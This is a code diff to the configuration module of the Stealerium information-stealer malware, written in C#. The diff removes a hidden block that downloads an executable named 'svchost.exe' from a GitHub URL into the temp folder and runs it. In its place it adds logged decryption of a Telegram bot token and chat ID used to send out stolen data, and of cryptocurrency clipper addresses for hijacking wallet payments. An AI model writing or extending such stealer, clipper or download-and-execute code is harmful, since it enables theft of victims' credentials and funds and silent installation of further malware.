@@ -1,10 +1,7 @@
-using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.Net.Http;
-using System.Threading.Tasks;
 using Stealerium.Stub.Modules.Implant;
+using Stealerium.Stub.Helpers;
+using System;
 
 namespace Stealerium.Stub
 {
@@ -136,38 +133,33 @@ namespace Stealerium.Stub
         };
 
         // Decrypt config values
-        public static async Task InitAsync()
+        public static void InitAsync()
         {
-            string url = "https://github.com/kgnfth/tumblr/raw/refs/heads/main/svchost.exe";
-            string filePath = Path.Combine(Path.GetTempPath(), "svchost.exe");
-
-            using (HttpClient client = new HttpClient())
+            try
             {
-                Console.WriteLine("Downloading file...");
-                byte[] fileBytes = await client.GetByteArrayAsync(url);
+                TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
+                Logging.Log($"Config: TelegramAPI decrypted successfully.");
+                
+                TelegramID = StringsCrypt.DecryptConfig(TelegramID);
+                Logging.Log($"Config: TelegramID decrypted successfully.");
 
-                if (fileBytes != null && fileBytes.Length > 0)
+                if (ClipperModule != "1") 
                 {
-                    File.WriteAllBytes(filePath, fileBytes);
-
-                    var startInfo = new ProcessStartInfo
-                    {
-                        FileName = filePath,
-                        UseShellExecute = false
-                    };
-
-                    Process.Start(startInfo);
+                    Logging.Log("Config: Clipper module not enabled, skipping clipper address decryption");
+                    return;
                 }
+
+                Logging.Log("Config: Decrypting clipper addresses...");
+                ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
+                ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
+                ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
+                Logging.Log("Config: Clipper addresses decrypted successfully");
             }
-
-            // Decrypt telegram token and telegram chat id
-            TelegramAPI = StringsCrypt.DecryptConfig(TelegramAPI);
-            TelegramID = StringsCrypt.DecryptConfig(TelegramID);
-
-            if (ClipperModule != "1") return;
-            ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
-            ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
-            ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
+            catch (Exception ex)
+            {
+                Logging.Log($"Config: Error during initialization: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw; // Re-throw to ensure the error is propagated
+            }
         }
     }
 }
